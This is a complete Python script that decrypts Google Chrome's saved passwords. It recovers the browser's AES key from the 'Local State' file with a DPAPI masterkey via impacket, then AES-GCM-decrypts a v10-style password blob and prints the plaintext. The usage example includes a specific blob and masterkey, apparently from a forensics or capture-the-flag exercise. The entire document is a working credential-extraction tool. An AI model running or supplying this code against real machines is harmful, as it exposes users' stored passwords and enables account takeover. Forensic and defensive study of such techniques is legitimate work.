#!/usr/bin/env python3
"""
Full Chrome DPAPI password decryption chain.

Stage 1: Read Local State -> extract os_crypt.encrypted_key (base64) ->
         strip "DPAPI" prefix -> DPAPI-decrypt with recovered masterkey -> raw AES-256 key.
Stage 2: Take the "v10..." encrypted password blob -> split into
         prefix(3) | nonce(12) | ciphertext | tag(16) -> AES-256-GCM decrypt with the key from stage 1.

Requirements:
    pip install pycryptodome   (or: pip install cryptography)

Usage:
    python3 chrome_decrypt.py \
        --local-state "/path/to/Local State" \
        --blob-hex "763130C88A72A64F35F63E883EA0A7F64A6870E46B0BBB469A756EDA88B7E324C3E1C51015AA6FD8D65AC48961E1EA324CE1707807FEB3D7" \
        --key 0x5e5715ec9b6df5a86e97902692a66d28e691f05d5bc1e04d0159cfe960e94c978c07e5004a0179d3a96df2468885a28175b0b02cc064445f116a752d2b3e9d40
"""

import argparse
import base64
import binascii
import json
import sys

from impacket.dpapi import DPAPI_BLOB


def get_encrypted_aes_key(local_state_path, masterkey_bytes):
    with open(local_state_path, "r", encoding="utf-8") as f:
        state = json.load(f)

    enc_key_b64 = state["os_crypt"]["encrypted_key"]
    enc_key_raw = base64.b64decode(enc_key_b64)

    prefix = enc_key_raw[:5]
    if prefix != b"DPAPI":
        print(f"[!] Unexpected prefix on encrypted_key: {prefix!r} (expected b'DPAPI')")
    else:
        print("[*] Confirmed 'DPAPI' prefix on encrypted_key")

    dpapi_blob_bytes = enc_key_raw[5:]
    print(f"[*] DPAPI blob for AES key is {len(dpapi_blob_bytes)} bytes")

    blob = DPAPI_BLOB(dpapi_blob_bytes)
    aes_key = blob.decrypt(masterkey_bytes)

    if aes_key is None:
        print("[-] Failed to decrypt the AES key -- masterkey GUID likely doesn't match this blob's GUID.")
        sys.exit(1)

    print(f"[+] Recovered raw AES-256 key ({len(aes_key)} bytes): {aes_key.hex()}")
    return aes_key


def decrypt_password_blob(blob_bytes, aes_key):
    if blob_bytes[:3] not in (b"v10", b"v11", b"v20"):
        print(f"[!] Unexpected version prefix: {blob_bytes[:3]!r}")
    version = blob_bytes[:3]
    nonce = blob_bytes[3:15]
    ciphertext_and_tag = blob_bytes[15:]
    ciphertext = ciphertext_and_tag[:-16]
    tag = ciphertext_and_tag[-16:]

    print(f"[*] version={version} nonce={nonce.hex()} ct_len={len(ciphertext)} tag={tag.hex()}")

    try:
        from Crypto.Cipher import AES
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except ImportError:
        pass

    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(aes_key)
        plaintext = aesgcm.decrypt(nonce, ciphertext + tag, None)
        return plaintext
    except ImportError:
        print("[-] Need either 'pycryptodome' or 'cryptography' installed:")
        print("    pip install pycryptodome")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--local-state", required=True, help="Path to Chrome 'Local State' file")
    parser.add_argument("--blob-hex", required=True, help="Hex of the v10... encrypted password blob")
    parser.add_argument("--key", required=True, help="Decrypted DPAPI masterkey, hex (0x... ok)")
    args = parser.parse_args()

    key_hex = args.key.replace("0x", "").strip()
    masterkey_bytes = binascii.unhexlify(key_hex)

    aes_key = get_encrypted_aes_key(args.local_state, masterkey_bytes)

    blob_hex = "".join(args.blob_hex.split())
    blob_bytes = binascii.unhexlify(blob_hex)

    plaintext = decrypt_password_blob(blob_bytes, aes_key)
    print()
    print("[+] PLAINTEXT PASSWORD:")
    print(plaintext.decode(errors="replace"))


if __name__ == "__main__":
    main()
